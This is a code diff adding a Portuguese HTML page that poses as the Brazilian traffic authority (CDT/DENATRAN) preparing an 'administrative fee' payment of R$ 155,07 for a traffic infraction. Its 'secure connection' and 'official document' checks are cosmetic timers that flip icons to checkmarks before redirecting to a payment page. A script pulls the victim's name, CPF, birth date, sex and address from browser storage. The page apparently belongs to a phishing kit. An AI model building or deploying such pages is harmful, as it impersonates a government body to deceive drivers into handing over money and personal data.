@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processando Pagamento - CDT</title>
+    <link rel="stylesheet" href="carregamento.css">
+</head>
+
+<body>
+    <div class="payment-container">
+        <div class="spinner"></div>
+        <h1 class="payment-title">Processando Guia de Pagamento - Taxa Administrativa</h1>
+        <p class="payment-subtitle">Preparando guia de pagamento (taxa administrativa) para a infração: RF710380</p>
+
+        <div class="status-items">
+            <div class="status-item" id="conexao">
+                <span class="status-icon">⭕</span>
+                <span class="status-text">Conexão Segura</span>
+            </div>
+            <div class="status-item" id="verificacao">
+                <span class="status-icon">⭕</span>
+                <span class="status-text">Verificação Completa</span>
+            </div>
+            <div class="status-item" id="documento">
+                <span class="status-icon">⭕</span>
+                <span class="status-text">Documento Oficial</span>
+            </div>
+        </div>
+
+        <div class="process-cards">
+            <div class="process-card" id="validacao">
+                <span class="card-icon">✓</span>
+                <h3>Validação de Dados</h3>
+                <p>Verificando informações do condutor</p>
+            </div>
+
+            <div class="process-card" id="conexao-segura">
+                <span class="card-icon">✓</span>
+                <h3>Conexão Segura</h3>
+                <p>Estabelecendo conexão com o sistema CDT (DENATRAN)</p>
+            </div>
+
+            <div class="process-card" id="processamento">
+                <span class="card-icon">⭕</span>
+                <h3>Processamento</h3>
+                <p>Gerando guia de pagamento (taxa administrativa)</p>
+            </div>
+
+            <div class="process-card" id="finalizacao">
+                <span class="card-icon">⭕</span>
+                <h3>Finalização</h3>
+                <p>Preparando código de pagamento / QR code</p>
+            </div>
+        </div>
+
+        <div class="payment-value">
+            <h3>Valor da Taxa Administrativa</h3>
+            <div class="value">R$ 155,07</div>
+            <p class="user-info"><span class="nome"></span>- <span class="cpf"></span></p>
+        </div>
+
+        <p class="redirect-message">Aguarde, redirecionando para o pagamento...</p>
+    </div>
+    <script src="payment.js"></script>
+</body>
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const steps = [
+            { id: 'validacao', delay: 1000 },
+            { id: 'conexao-segura', delay: 2000 },
+            { id: 'processamento', delay: 3000 },
+            { id: 'finalizacao', delay: 4000 }
+        ];
+
+        const statusItems = [
+            { id: 'conexao', delay: 1500 },
+            { id: 'verificacao', delay: 2500 },
+            { id: 'documento', delay: 3500 }
+        ];
+
+        steps.forEach(step => {
+            setTimeout(() => {
+                const element = document.getElementById(step.id);
+                element.classList.add('active');
+                element.querySelector('.card-icon').textContent = '✓';
+            }, step.delay);
+        });
+
+        statusItems.forEach(item => {
+            setTimeout(() => {
+                const element = document.getElementById(item.id);
+                element.classList.add('completed');
+                element.querySelector('.status-icon').textContent = '✓';
+            }, item.delay);
+        });
+
+        setTimeout(() => {
+            window.location.href = 'guia.html';
+        }, 5000);
+    });
+
+
+</script>
+
+
+<script>
+    const nome = localStorage.getItem('nome');
+    const cpf = localStorage.getItem('cpf');
+    const nascimento = localStorage.getItem('nascimento');
+    const sexo = localStorage.getItem('sexo');
+    const endereco = localStorage.getItem('endereco');
+
+    document.querySelector('.nome').textContent = nome;
+    document.querySelector('.cpf').textContent = cpf;
+</script>
+
+</html>
